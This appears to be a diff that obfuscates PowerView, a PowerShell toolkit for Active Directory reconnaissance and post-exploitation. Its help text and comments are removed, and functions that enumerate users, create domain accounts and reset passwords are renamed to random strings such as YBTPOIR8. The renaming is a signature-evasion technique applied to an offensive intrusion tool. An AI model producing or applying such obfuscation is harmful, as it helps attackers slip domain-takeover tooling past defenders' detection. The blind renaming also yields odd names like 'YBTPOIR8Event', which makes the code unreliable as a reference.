-Required Dependencies: Get-Forest  
-
-.DESCRIPTION
-
-Returns all domains for the current forest or the forest specified
-by -Forest X.
-
-.PARAMETER Forest
-
-Specifies the forest name to query for domains.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target forest.
-
-.EXAMPLE
-
-Get-ForestDomain
-
-.EXAMPLE
-
-Get-ForestDomain -Forest external.local
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-ForestDomain -Credential $Cred
-
-.OUTPUTS
-
-System.DirectoryServices.ActiveDirectory.Domain
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
@@ -4432,45 +2704,8 @@ System.DirectoryServices.ActiveDirectory.Domain
 }
 
 
-function Get-ForestGlobalCatalog {
-<#
-.SYNOPSIS
+function 6GBUTHZD {
 
-Return all global catalogs for the current (or specified) forest.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Forest  
-
-.DESCRIPTION
-
-Returns all global catalogs for the current forest or the forest specified
-by -Forest X by using Get-Forest to retrieve the specified forest object
-and the .FindAllGlobalCatalogs() to enumerate the global catalogs.
-
-.PARAMETER Forest
-
-Specifies the forest name to query for global catalogs.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-ForestGlobalCatalog
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-ForestGlobalCatalog -Credential $Cred
-
-.OUTPUTS
-
-System.DirectoryServices.ActiveDirectory.GlobalCatalog
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
@@ -4500,72 +2735,8 @@ System.DirectoryServices.ActiveDirectory.GlobalCatalog
 }
 
 
-function Get-ForestSchemaClass {
-<#
-.SYNOPSIS
+function 1XQNYMZE {
 
-Helper that returns the Active Directory schema classes for the current
-(or specified) forest or returns just the schema class specified by
--ClassName X.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Forest  
-
-.DESCRIPTION
-
-Uses Get-Forest to retrieve the current (or specified) forest. By default,
-the .FindAllClasses() method is executed, returning a collection of
-[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass] results.
-If "-FindClass X" is specified, the [DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
-result for the specified class name is returned.
-
-.PARAMETER ClassName
-
-Specifies a ActiveDirectorySchemaClass name in the found schema to return.
-
-.PARAMETER Forest
-
-The forest to query for the schema, defaults to the current forest.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Get-ForestSchemaClass
-
-Returns all domain schema classes for the current forest.
-
-.EXAMPLE
-
-Get-ForestSchemaClass -Forest dev.testlab.local
-
-Returns all domain schema classes for the external.local forest.
-
-.EXAMPLE
-
-Get-ForestSchemaClass -ClassName user -Forest external.local
-
-Returns the user schema class for the external.local domain.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-ForestSchemaClass -ClassName user -Forest external.local -Credential $Cred
-
-Returns the user schema class for the external.local domain using
-the specified alternate credentials.
-
-.OUTPUTS
-
-[DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass]
-
-An ActiveDirectorySchemaClass returned from the found schema.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
@@ -4608,101 +2779,8 @@ An ActiveDirectorySchemaClass returned from the found schema.
 }
 
 
-function Find-DomainObjectPropertyOutlier {
-<#
-.SYNOPSIS
+function QYR5XJ8B {
 
-Finds user/group/computer objects in AD that have 'outlier' properties set.
-
-Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
-License: BSD 3-Clause  
-Required Dependencies: Get-Domain, Get-DomainUser, Get-DomainGroup, Get-DomainComputer
-
-.DESCRIPTION
-
-A 'reference' set of property names is calculated, either from a standard set preserved
-for user/group/computers, or from the array of names passed to -ReferencePropertySet, or
-from the property names of the passed -ReferenceObject. Every user/group/computer object
-(depending on determined class) are enumerated, and for each object, if the object has a
-'non-standard' property set (meaning a property not held by the reference set), the object's
-samAccountName, property name, and property value are output to the pipeline.
-
-.PARAMETER ClassName
-
-Specifies the AD object class to find property outliers for, 'user', 'group', or 'computer'.
-If -ReferenceObject is specified, this will be automatically extracted, if possible.
-
-.PARAMETER ReferencePropertySet
-
-Specifies an array of property names to diff against the class schema.
-
-.PARAMETER ReferenceObject
-
-Specicifes the PowerView user/group/computer object to extract property names
-from to use as the reference set.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-Find-DomainObjectPropertyOutlier -ClassName 'User'
-
-Enumerates users in the current domain with 'outlier' properties filled in.
-
-.EXAMPLE
-
-Find-DomainObjectPropertyOutlier -ClassName 'Group' -Domain external.local
-
-Enumerates groups in the external.local forest/domain with 'outlier' properties filled in.
-
-.EXAMPLE
-
-Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
-
-Enumerates computers in the current domain with 'outlier' properties filled in.
-
-.OUTPUTS
-
-PowerView.PropertyOutlier
-
-Custom PSObject with translated object property outliers.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.PropertyOutlier')]
@@ -4779,7 +2857,7 @@ Custom PSObject with translated object property outliers.
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        # Domain / Credential
+        
         if ($PSBoundParameters['Domain']) {
             if ($PSBoundParameters['Credential']) {
                 $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
@@ -4787,7 +2865,7 @@ Custom PSObject with translated object property outliers.
             else {
                 $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
             }
-            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
+            Write-Verbose "[QYR5XJ8B] Enumerated forest '$TargetForest' for target domain '$Domain'"
         }
 
         $SchemaArguments = @{}
@@ -4800,39 +2878,39 @@ Custom PSObject with translated object property outliers.
     PROCESS {
 
         if ($PSBoundParameters['ReferencePropertySet']) {
-            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
+            Write-Verbose "[QYR5XJ8B] Using specified -ReferencePropertySet"
             $ReferenceObjectProperties = $ReferencePropertySet
         }
         elseif ($PSBoundParameters['ReferenceObject']) {
-            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
+            Write-Verbose "[QYR5XJ8B] Extracting property names from -ReferenceObject to use as the reference property set"
             $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
             $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
-            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
+            Write-Verbose "[QYR5XJ8B] Calculated ReferenceObjectClass : $ReferenceObjectClass"
         }
         else {
-            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
+            Write-Verbose "[QYR5XJ8B] Using the default reference property set for the object class '$ClassName'"
         }
 
         if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
-            $Objects = Get-DomainUser @SearcherArguments
+            $Objects = YBTPOIR8 @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $UserReferencePropertySet
             }
         }
         elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
-            $Objects = Get-DomainGroup @SearcherArguments
+            $Objects = H3GAYKFB @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $GroupReferencePropertySet
             }
         }
         elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
-            $Objects = Get-DomainComputer @SearcherArguments
+            $Objects = VVVCIHJ3 @SearcherArguments
             if (-not $ReferenceObjectProperties) {
                 $ReferenceObjectProperties = $ComputerReferencePropertySet
             }
         }
         else {
-            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
+            throw "[QYR5XJ8B] Invalid class: $ClassName"
         }
 
         ForEach ($Object in $Objects) {
@@ -4852,195 +2930,14 @@ Custom PSObject with translated object property outliers.
 }
 
 
-########################################################
-#
-# "net *" replacements and other fun start below
-#
-########################################################
 
-function Get-DomainUser {
-<#
-.SYNOPSIS
 
-Return all users or specific user objects in AD.
 
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-DomainSearcher, Convert-ADName, Convert-LDAPProperty  
 
-.DESCRIPTION
 
-Builds a directory searcher object using Get-DomainSearcher, builds a custom
-LDAP filter based on targeting/filter parameters, and searches for all objects
-matching the criteria. To only return specific properties, use
-"-Properties samaccountname,usnchanged,...". By default, all user objects for
-the current domain are returned.
 
-.PARAMETER Identity
+function YBTPOIR8 {
 
-A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201).
-Wildcards accepted. Also accepts DOMAIN\user format.
-
-.PARAMETER SPN
-
-Switch. Only return user objects with non-null service principal names.
-
-.PARAMETER UACFilter
-
-Dynamic parameter that accepts one or more values from $UACEnum, including
-"NOT_X" negation forms. To see all possible values, run '0|ConvertFrom-UACValue -ShowAll'.
-
-.PARAMETER AdminCount
-
-Switch. Return users with '(adminCount=1)' (meaning are/were privileged).
-
-.PARAMETER AllowDelegation
-
-Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'
-
-.PARAMETER DisallowDelegation
-
-Switch. Return user accounts that are marked as 'sensitive and not allowed for delegation'
-
-.PARAMETER TrustedToAuth
-
-Switch. Return computer objects that are trusted to authenticate for other principals.
-
-.PARAMETER PreauthNotRequired
-
-Switch. Return user accounts with "Do not require Kerberos preauthentication" set.
-
-.PARAMETER Domain
-
-Specifies the domain to use for the query, defaults to the current domain.
-
-.PARAMETER LDAPFilter
-
-Specifies an LDAP query string that is used to filter Active Directory objects.
-
-.PARAMETER Properties
-
-Specifies the properties of the output object to retrieve from the server.
-
-.PARAMETER SearchBase
-
-The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
-Useful for OU queries.
-
-.PARAMETER Server
-
-Specifies an Active Directory server (domain controller) to bind to.
-
-.PARAMETER SearchScope
-
-Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).
-
-.PARAMETER ResultPageSize
-
-Specifies the PageSize to set for the LDAP searcher object.
-
-.PARAMETER ServerTimeLimit
-
-Specifies the maximum amount of time the server spends searching. Default of 120 seconds.
-
-.PARAMETER SecurityMasks
-
-Specifies an option for examining security information of a directory object.
-One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.
-
-.PARAMETER Tombstone
-
-Switch. Specifies that the searcher should also return deleted/tombstoned objects.
-
-.PARAMETER FindOne
-
-Only return one result object.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.PARAMETER Raw
-
-Switch. Return raw results instead of translating the fields into a custom PSObject.
-
-.EXAMPLE
-
-Get-DomainUser -Domain testlab.local
-
-Return all users for the testlab.local domain
-
-.EXAMPLE
-
-Get-DomainUser "S-1-5-21-890171859-3433809279-3366196753-1108","administrator"
-
-Return the user with the given SID, as well as Administrator.
-
-.EXAMPLE
-
-'S-1-5-21-890171859-3433809279-3366196753-1114', 'CN=dfm,CN=Users,DC=testlab,DC=local','4c435dd7-dc58-4b14-9a5e-1fdb0e80d201','administrator' | Get-DomainUser -Properties samaccountname,lastlogoff
-
-lastlogoff                                   samaccountname
-----------                                   --------------
-12/31/1600 4:00:00 PM                        dfm.a
-12/31/1600 4:00:00 PM                        dfm
-12/31/1600 4:00:00 PM                        harmj0y
-12/31/1600 4:00:00 PM                        Administrator
-
-.EXAMPLE
-
-Get-DomainUser -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -AdminCount -AllowDelegation
-
-Search the specified OU for privileged user (AdminCount = 1) that allow delegation
-
-.EXAMPLE
-
-Get-DomainUser -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon
-
-Search for users with a primary group ID other than 513 ('domain users') and only return samaccountname and lastlogon
-
-.EXAMPLE
-
-Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED
-
-Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-Get-DomainUser -Credential $Cred
-
-.EXAMPLE
-
-Get-Domain | Select-Object -Expand name
-testlab.local
-
-Get-DomainUser dev\user1 -Verbose -Properties distinguishedname
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local
-VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=dev,DC=testlab,DC=local
-VERBOSE: [Get-DomainUser] filter string: (&(samAccountType=805306368)(|(samAccountName=user1)))
-
-distinguishedname
------------------
-CN=user1,CN=Users,DC=dev,DC=testlab,DC=local
-
-.INPUTS
-
-String
-
-.OUTPUTS
-
-PowerView.User
-
-Custom PSObject with translated user property fields.
-
-PowerView.User.Raw
-
-The raw DirectoryServices.SearchResult object, if -Raw is enabled.
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5130,10 +3027,10 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
-        # add in the negations
+        
         $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
-        # create new dynamic parameter
-        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        
+        1FN2NPRI -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
@@ -5148,13 +3045,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
         if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
         if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
         if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
-        $UserSearcher = Get-DomainSearcher @SearcherArguments
+        $UserSearcher = NJUXTHTL @SearcherArguments
     }
 
     PROCESS {
-        #bind dynamic parameter to a friendly variable
+        
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
+            1FN2NPRI -CreateVariables -BoundParameters $PSBoundParameters
         }
 
         if ($UserSearcher) {
@@ -5168,14 +3065,14 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                 elseif ($IdentityInstance -match '^CN=') {
                     $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                     if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
-                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
-                        #   and rebuild the domain searcher
+                        
+                        
                         $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
-                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        Write-Verbose "[YBTPOIR8] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                         $SearcherArguments['Domain'] = $IdentityDomain
-                        $UserSearcher = Get-DomainSearcher @SearcherArguments
+                        $UserSearcher = NJUXTHTL @SearcherArguments
                         if (-not $UserSearcher) {
-                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
+                            Write-Warning "[YBTPOIR8] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
@@ -5190,8 +3087,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
                         $UserName = $IdentityInstance.Split('\')[1]
                         $IdentityFilter += "(samAccountName=$UserName)"
                         $SearcherArguments['Domain'] = $UserDomain
-                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
-                        $UserSearcher = Get-DomainSearcher @SearcherArguments
+                        Write-Verbose "[YBTPOIR8] Extracted domain '$UserDomain' from '$IdentityInstance'"
+                        $UserSearcher = NJUXTHTL @SearcherArguments
                     }
                 }
                 else {
@@ -5204,36 +3101,36 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
 
             if ($PSBoundParameters['SPN']) {
-                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
+                Write-Verbose '[YBTPOIR8] Searching for non-null service principal names'
                 $Filter += '(servicePrincipalName=*)'
             }
             if ($PSBoundParameters['AllowDelegation']) {
-                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
-                # negation of "Accounts that are sensitive and not trusted for delegation"
+                Write-Verbose '[YBTPOIR8] Searching for users who can be delegated'
+                
                 $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
             }
             if ($PSBoundParameters['DisallowDelegation']) {
-                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
+                Write-Verbose '[YBTPOIR8] Searching for users who are sensitive and not trusted for delegation'
                 $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
             }
             if ($PSBoundParameters['AdminCount']) {
-                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
+                Write-Verbose '[YBTPOIR8] Searching for adminCount=1'
                 $Filter += '(admincount=1)'
             }
             if ($PSBoundParameters['TrustedToAuth']) {
-                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
+                Write-Verbose '[YBTPOIR8] Searching for users that are trusted to authenticate for other principals'
                 $Filter += '(msds-allowedtodelegateto=*)'
             }
             if ($PSBoundParameters['PreauthNotRequired']) {
-                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
+                Write-Verbose '[YBTPOIR8] Searching for user accounts that do not require kerberos preauthenticate'
                 $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
             }
             if ($PSBoundParameters['LDAPFilter']) {
-                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
+                Write-Verbose "[YBTPOIR8] Using additional LDAP filter: $LDAPFilter"
                 $Filter += "$LDAPFilter"
             }
 
-            # build the LDAP filter for the dynamic UAC filter value
+            
             $UACFilter | Where-Object {$_} | ForEach-Object {
                 if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
@@ -5247,13 +3144,13 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             }
 
             $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
-            Write-Verbose "[Get-DomainUser] filter string: $($UserSearcher.filter)"
+            Write-Verbose "[YBTPOIR8] filter string: $($UserSearcher.filter)"
 
             if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
             else { $Results = $UserSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 if ($PSBoundParameters['Raw']) {
-                    # return raw result objects
+                    
                     $User = $_
                     $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                 }
@@ -5266,7 +3163,7 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[Get-DomainUser] Error disposing of the Results object: $_"
+                    Write-Verbose "[YBTPOIR8] Error disposing of the Results object: $_"
                 }
             }
             $UserSearcher.dispose()
@@ -5275,90 +3172,8 @@ The raw DirectoryServices.SearchResult object, if -Raw is enabled.
 }
 
 
-function New-DomainUser {
-<#
-.SYNOPSIS
+function RBHHMLOV {
 
-Creates a new domain user (assuming appropriate permissions) and returns the user object.
-
-TODO: implement all properties that New-ADUser implements (https://technet.microsoft.com/en-us/library/ee617253.aspx).
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-PrincipalContext  
-
-.DESCRIPTION
-
-First binds to the specified domain context using Get-PrincipalContext.
-The bound domain context is then used to create a new
-DirectoryServices.AccountManagement.UserPrincipal with the specified user properties.
-
-.PARAMETER SamAccountName
-
-Specifies the Security Account Manager (SAM) account name of the user to create.
-Maximum of 256 characters. Mandatory.
-
-.PARAMETER AccountPassword
-
-Specifies the password for the created user. Mandatory.
-
-.PARAMETER Name
-
-Specifies the name of the user to create. If not provided, defaults to SamAccountName.
-
-.PARAMETER DisplayName
-
-Specifies the display name of the user to create. If not provided, defaults to SamAccountName.
-
-.PARAMETER Description
-
-Specifies the description of the user to create.
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for user/group principals, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword
-
-Creates the 'harmj0y2' user with the specified description and password.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$user = New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword -Credential $Cred
-
-Creates the 'harmj0y2' user with the specified description and password, using the specified
-alternate credentials.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-New-DomainUser -SamAccountName andy -AccountPassword $UserPassword -Credential $Cred | Add-DomainGroupMember 'Domain Admins' -Credential $Cred
-
-Creates the 'andy' user with the specified description and password, using the specified
-alternate credentials, and adds the user to 'domain admins' using Add-DomainGroupMember
-and the alternate credentials.
-
-.OUTPUTS
-
-DirectoryServices.AccountManagement.UserPrincipal
-
-.LINK
-
-http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5401,12 +3216,12 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
     }
     if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
     if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
-    $Context = Get-PrincipalContext @ContextArguments
+    $Context = X23WOD9H @ContextArguments
 
     if ($Context) {
         $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)
 
-        # set all the appropriate user parameters
+        
         $User.SamAccountName = $Context.Identity
         $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
         $User.SetPassword($TempCred.GetNetworkCredential().Password)
@@ -5430,79 +3245,21 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
             $User.Description = $Description
         }
 
-        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
+        Write-Verbose "[RBHHMLOV] Attempting to create user '$SamAccountName'"
         try {
             $Null = $User.Save()
-            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
+            Write-Verbose "[RBHHMLOV] User '$SamAccountName' successfully created"
             $User
         }
         catch {
-            Write-Warning "[New-DomainUser] Error creating user '$SamAccountName' : $_"
+            Write-Warning "[RBHHMLOV] Error creating user '$SamAccountName' : $_"
         }
     }
 }
 
 
-function Set-DomainUserPassword {
-<#
-.SYNOPSIS
+function KYT5SPSA {
 
-Sets the password for a given user identity.
-
-Author: Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
-Required Dependencies: Get-PrincipalContext  
-
-.DESCRIPTION
-
-First binds to the specified domain context using Get-PrincipalContext.
-The bound domain context is then used to search for the specified user -Identity,
-which returns a DirectoryServices.AccountManagement.UserPrincipal object. The
-SetPassword() function is then invoked on the user, setting the password to -AccountPassword.
-
-.PARAMETER Identity
-
-A user SamAccountName (e.g. User1), DistinguishedName (e.g. CN=user1,CN=Users,DC=testlab,DC=local),
-SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1113), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
-specifying the user to reset the password for.
-
-.PARAMETER AccountPassword
-
-Specifies the password to reset the target user's to. Mandatory.
-
-.PARAMETER Domain
-
-Specifies the domain to use to search for the user identity, defaults to the current domain.
-
-.PARAMETER Credential
-
-A [Management.Automation.PSCredential] object of alternate credentials
-for connection to the target domain.
-
-.EXAMPLE
-
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword
-
-Resets the password for 'andy' to the password specified.
-
-.EXAMPLE
-
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
-$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
-
-Resets the password for 'andy' usering the alternate credentials specified.
-
-.OUTPUTS
-
-DirectoryServices.AccountManagement.UserPrincipal
-
-.LINK
-
-http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
-#>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -5531,102 +3288,33 @@ http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-
     $ContextArguments = @{ 'Identity' = $Identity }
     if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
     if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
-    $Context = Get-PrincipalContext @ContextArguments
+    $Context = X23WOD9H @ContextArguments
 
     if ($Context) {
         $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)
 
         if ($User) {
-            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
+            Write-Verbose "[KYT5SPSA] Attempting to set the password for user '$Identity'"
             try {
                 $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                 $User.SetPassword($TempCred.GetNetworkCredential().Password)
 
                 $Null = $User.Save()
-                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
+                Write-Verbose "[KYT5SPSA] Password for user '$Identity' successfully reset"
             }
             catch {
-                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$Identity' : $_"
+                Write-Warning "[KYT5SPSA] Error setting password for user '$Identity' : $_"
             }
         }
         else {
-            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
+            Write-Warning "[KYT5SPSA] Unable to find user '$Identity'"
         }
     }
 }
 
 
-function Get-DomainUserEvent {
-<#
-.SYNOPSIS
+function YBTPOIR8Event {
 
-Enumerate account logon events (ID 4624) and Logon with explicit credential
-events (ID 4648) from the specified host (default of the localhost).
-
-Author: Lee Christensen (@tifkin_), Justin Warner (@sixdub), Will Schroeder (@harmj0y)  
-License: BSD 3-Clause  
